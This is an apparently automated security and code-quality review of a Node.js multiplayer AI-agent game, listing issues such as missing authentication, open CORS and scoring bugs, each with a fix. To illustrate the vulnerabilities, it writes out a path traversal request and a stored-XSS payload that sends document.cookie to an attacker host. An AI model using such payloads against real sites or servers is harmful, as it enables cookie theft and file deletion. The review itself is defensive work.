# Code Review: Soul vs Soul (Beast Games)

**Reviewer:** Claude (automated review)  
**Date:** 2026-02-19  
**Verdict:** 🔴 **Not production-ready.** Multiple critical security issues, no authentication, no rate limiting, and several logic bugs.

---

## 🚨 Critical Issues (Must Fix Before Launch)

### 1. **No Authentication or Authorization — Anyone Can Control the Game**
**Files:** `server.js` — all routes  
Every API endpoint is completely open. Anyone can:
- `POST /api/start` — start games at will
- `DELETE /api/agents/:id` — delete any agent
- `POST /api/agents/upload` — upload files to the server
- `POST /api/agents/select` — flood the roster

There is zero authentication. In production, bots will spam your server within minutes.

**Fix:** Add session-based auth, API keys, or at minimum rate limiting per IP on all mutating endpoints.

### 2. **Path Traversal via Agent ID in Delete Endpoint**
**File:** `server.js:222-234`  
```js
const agentFile = path.join(__dirname, '../data/agents', `${id}.json`);
if (fs.existsSync(agentFile)) {
  fs.unlinkSync(agentFile);
}
```
The `id` comes directly from `req.params.id` with **no sanitization**. An attacker can send:
```
DELETE /api/agents/../../etc/important-file
```
This would attempt to delete `data/agents/../../etc/important-file.json`. While the `.json` suffix limits damage, `path.join` resolves `..` traversals, so `../` sequences work. Combined with creative filenames, this is exploitable.

**Fix:** Validate that `id` matches a strict pattern (e.g., `/^[a-zA-Z0-9_-]+$/`) and verify the resolved path stays within the agents directory:
```js
const resolved = path.resolve(agentsDir, `${id}.json`);
if (!resolved.startsWith(path.resolve(agentsDir))) throw new Error('Invalid id');
```

### 3. **File Upload Content Not Sanitized — Stored XSS Risk**
**File:** `server.js:190-210`, `app.js` (multiple locations)  
Uploaded file contents (SOUL.md, IDENTITY.md) are read as raw text, stored as JSON, then rendered in the browser. The frontend uses `innerHTML` extensively:
```js
// app.js — multiple locations
card.innerHTML = `...${agent.name}...${agent.personality}...`;
msg.innerHTML = `...${data.message}...`;
```
Agent names, personalities, and trash talk responses are injected via `innerHTML` without escaping. An attacker uploads a SOUL.md containing:
```
<img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">
```
This becomes the agent's `personality` field and gets rendered as HTML in every spectator's browser.

**Fix:** Use `textContent` instead of `innerHTML` for user-supplied data, or sanitize with a library like DOMPurify. On the server side, strip HTML tags from uploaded content.

### 4. **API Keys Exposed to Client via Game State Broadcast**
**File:** `server.js:290`  
```js
socket.emit('game_state', this.gameState);
```
The `gameState` object includes `activeAgents`, which includes agent objects with `systemPrompt` fields. These system prompts contain the full SOUL.md content of every agent — including potentially private/proprietary personality definitions people uploaded.

More critically, if an agent object ever gets the API configuration attached, keys could leak. The `agentManager.agents` array includes `systemPrompt`, `temperature`, etc.

**Fix:** Create a `sanitizeForClient()` method that strips sensitive fields before broadcasting. Only send `id`, `name`, `emoji`, `color`, `score`, `status`.

### 5. **CORS Wide Open**
**File:** `server.js:17-20`  
```js
cors: {
  origin: "*",
  methods: ["GET", "POST"]
}
```
Any website can connect WebSockets and interact with the game. Combined with no auth, this means any site can embed your game, start games, upload agents, etc.

**Fix:** Set origin to your actual domain(s).

### 6. **Multer Temp Files Not Cleaned on Error**
**File:** `server.js:190-215`  
Temp files are only cleaned up in the success path. If an error occurs before cleanup (e.g., JSON.stringify fails, fs.writeFileSync fails), temp files persist in `temp/` forever. Over time, disk fills up.

**Fix:** Use a `finally` block or multer's built-in temp file cleanup. Better yet, use `multer.memoryStorage()` since files are ≤50KB.

---

## ⚠️ Important Issues (Should Fix)

### 7. **Race Condition: Multiple Simultaneous Game Starts**
**File:** `server.js:143-149`  
```js
if (this.gameState.status === 'running') {
  return res.status(400).json({ error: 'Game already running' });
}
await this.startGame();
```
Two concurrent `POST /api/start` requests can both pass the check before either sets status to 'running'. The `startGame()` method has a weak guard (`if (this.gameEngine) return`) but there's a window between the check and the assignment.

**Fix:** Use a mutex/lock pattern or a simple flag with atomic check-and-set.

### 8. **Memory Leak: gameLog Grows Unbounded**
**File:** `server.js:319-325`  
```js
this.gameState.gameLog.push({
  event, data,
  timestamp: moment().toISOString()
});
```
Every broadcast event (including per-agent thinking events, trash talk, etc.) is pushed to `gameLog` and **never trimmed**. With frequent games and many agents, this array grows forever. The entire `gameLog` is also sent to new WebSocket connections.

**Fix:** Cap the log size (e.g., last 200 entries) or clear between games.

### 9. **Synchronous File I/O on Request Path**
**Files:** `server.js` (throughout), `Logger.js`  
Every request that touches the filesystem uses synchronous methods: `fs.readFileSync`, `fs.writeFileSync`, `fs.existsSync`, `fs.readdirSync`. This blocks the event loop during file operations. Under load, the server will stall.

**Fix:** Use async versions (`fs.promises.readFile`, etc.) for all request-path file operations. Logger should buffer and write asynchronously.

### 10. **No Input Validation on Agent Names**
**File:** `server.js:165, 192`  
Agent names (`agentName`, `customName`) accept any string with no length limit, no character restrictions. An attacker can:
- Submit a 10MB agent name (no body size limit on JSON endpoint)
- Use special characters that break JSON, HTML, or filesystem operations
- Use empty strings

**Fix:** Validate name length (3-50 chars), allowed characters, and set `express.json({ limit: '10kb' })`.

### 11. **Monkey-Patching Game Engine Methods is Fragile**
**File:** `server.js:266-360` (`setupGameEventListeners`)  
The server hooks into the game engine by replacing methods at runtime:
```js
const originalRunRound = this.gameEngine.runRound.bind(this.gameEngine);
this.gameEngine.runRound = async (roundInfo) => { ... };
```
This is brittle — any refactor of GameEngine breaks the server silently. It also creates closure-based memory that's hard to debug.

**Fix:** Use an EventEmitter pattern in GameEngine. Emit events that the server subscribes to.

### 12. **Strategy Challenge Scoring Can Exceed 100**
**File:** `ChallengeManager.js:210`  
```js
score: scores.get(agent.id) * 10, // Scale to 0-100
```
With 3 rounds, max score per round is 5 (defect while opponent cooperates), so max raw = 15, scaled = 150. Other challenges cap at 100. This gives unfair weight to strategy challenges.

**Fix:** Normalize: `Math.min(scores.get(agent.id) * 10, 100)` or scale differently.

### 13. **Odd Number of Agents in Strategy Challenge = One Agent Skipped**
**File:** `ChallengeManager.js:186-192`  
```js
for (let i = 0; i < shuffled.length; i += 2) {
  if (i + 1 < shuffled.length) {
    pairs.push([shuffled[i], shuffled[i + 1]]);
  }
}
```
If there's an odd number of agents, the last one gets 0 points across all rounds and is almost certainly eliminated. This is a significant fairness bug.

**Fix:** Give the unpaired agent a bye (average score of the round), or use round-robin pairing.

### 14. **No Timeout on LLM API Calls**
**File:** `AgentManager.js:104-130`  
Axios calls to OpenAI/Anthropic have no timeout. If an API hangs, the entire game stalls forever.

**Fix:** Add `timeout: 30000` to axios config.

### 15. **Hardcoded Model Names**
**File:** `AgentManager.js:106, 118`  
```js
model: 'gpt-4',
model: 'claude-3-sonnet-20240229',
```
These are hardcoded. `claude-3-sonnet-20240229` is an old model. No way to configure without code changes.

**Fix:** Use environment variables: `process.env.OPENAI_MODEL || 'gpt-4o'`.

### 16. **No Retry Logic for API Failures**
**File:** `AgentManager.js:96-99`  
```js
} catch (error) {
  this.logger.logError(`Error querying agent ${agent.name}`, error);
  return `*${agent.name} is having technical difficulties*`;
}
```
On API failure, the agent gets a placeholder response that will score poorly, virtually guaranteeing elimination. A transient network hiccup shouldn't be a death sentence.

**Fix:** Retry 2-3 times with exponential backoff before falling back.

### 17. **`dotenv` Never Loaded**
**File:** `package.json` lists `dotenv` as dependency, but it's never `require('dotenv').config()`'d anywhere.

**Fix:** Add `require('dotenv').config()` at the top of `server.js`.

---

## 💡 Minor Improvements

### 18. **Game Log Saved to CWD, Not a Data Directory**
**File:** `GameEngine.js:142`  
```js
fs.writeFileSync(logFile, JSON.stringify(gameData, null, 2));
```
Saves `soul-vs-soul-TIMESTAMP.json` to whatever the current working directory is. Should go in `data/logs/`.

### 19. **`moment` is Deprecated**
**Files:** All  
`moment.js` is in maintenance mode. Consider `dayjs` (same API, 2KB) or native `Intl.DateTimeFormat`.

### 20. **Logger Creates New Log File Per Instance**
**File:** `Logger.js:7`  
Every time a Logger is instantiated, a new file is created. If the server restarts frequently, you get hundreds of empty log files.

### 21. **Dead Code: `updateAgentCount` Called But Not Defined Properly**
**File:** `app.js:575`  
`this.updateAgentCount()` is called in `addUploadedAgentToGrid` but there's no `updateAgentCount` method defined in the class. This throws a silent error.

### 22. **Frontend `innerHTML` Usage for Non-User Data**
Even for non-user data, using template literals with `innerHTML` is a maintenance hazard. One future change that includes user data will create an XSS hole.

### 23. **No `helmet` for Security Headers**
Express serves responses without security headers (CSP, X-Frame-Options, etc.).

### 24. **No Graceful Shutdown**
The server doesn't handle SIGTERM/SIGINT to close WebSocket connections and finish in-progress games.

### 25. **`requestAnimationFrame` for Timestamps is Wasteful**
**File:** `app.js:625-630`  
`startTimestampLoop` runs `requestAnimationFrame` continuously (60fps) just to update "2s ago" → "3s ago" timestamps. A 5-second `setInterval` would suffice.

### 26. **No CSP / Script Integrity**
The HTML loads Socket.IO from the server path without SRI. No Content-Security-Policy header is set.

### 27. **Frontend Doesn't Handle Reconnection State**
If the WebSocket disconnects mid-game, the UI shows "Offline" but doesn't attempt to resync game state on reconnect (Socket.IO will reconnect, but `game_state` is only sent on initial connection).

### 28. **`personalities.json` Read from Disk on Every Request**
**File:** `server.js:155-165`  
The personalities file is read and parsed on every `/api/personalities` request instead of being cached.

---

## 📊 Overall Assessment

| Category | Grade | Notes |
|----------|-------|-------|
| **Security** | 🔴 F | Open endpoints, XSS, path traversal, no auth, wide-open CORS |
| **Reliability** | 🟡 D+ | Race conditions, no timeouts, no retries, memory leaks |
| **Code Quality** | 🟡 C | Readable but fragile. Monkey-patching, sync I/O, dead code |
| **Frontend** | 🟡 C+ | Polished UI, but innerHTML XSS throughout, no error boundaries |
| **Production Readiness** | 🔴 F | No auth, no rate limiting, no env config, no monitoring, no HTTPS |

### What's Good
- Clean separation of concerns (GameEngine, AgentManager, ChallengeManager)
- The frontend UI is genuinely impressive — smooth animations, mobile-responsive, good UX
- Challenge variety is creative and entertaining
- Dynamic round structure based on agent count is clever
- Leaderboard persistence is a nice touch

### What's Missing for Production
1. **Authentication** (even simple API key or session)
2. **Rate limiting** (express-rate-limit, 5 lines of code)
3. **Input sanitization** (server + client)
4. **HTTPS / TLS**
5. **Environment configuration** (dotenv actually loaded, configurable models)
6. **Error monitoring** (Sentry, LogRocket, etc.)
7. **Health check endpoint**
8. **Database** (filesystem JSON won't survive concurrent writes)
9. **Process manager** (PM2 or similar for restarts)
10. **Tests** (zero test coverage)

### Priority Fix Order
1. Input sanitization + path traversal fix (30 min)
2. Add authentication to mutating endpoints (1-2 hrs)
3. Fix innerHTML XSS in frontend (1 hr)
4. Add rate limiting (15 min)
5. Fix CORS to specific origins (5 min)
6. Add API timeouts and retry logic (30 min)
7. Fix strategy challenge scoring bug (10 min)
8. Load dotenv, externalize config (20 min)
9. Switch to async file I/O (1-2 hrs)
10. Add EventEmitter to GameEngine (1-2 hrs)
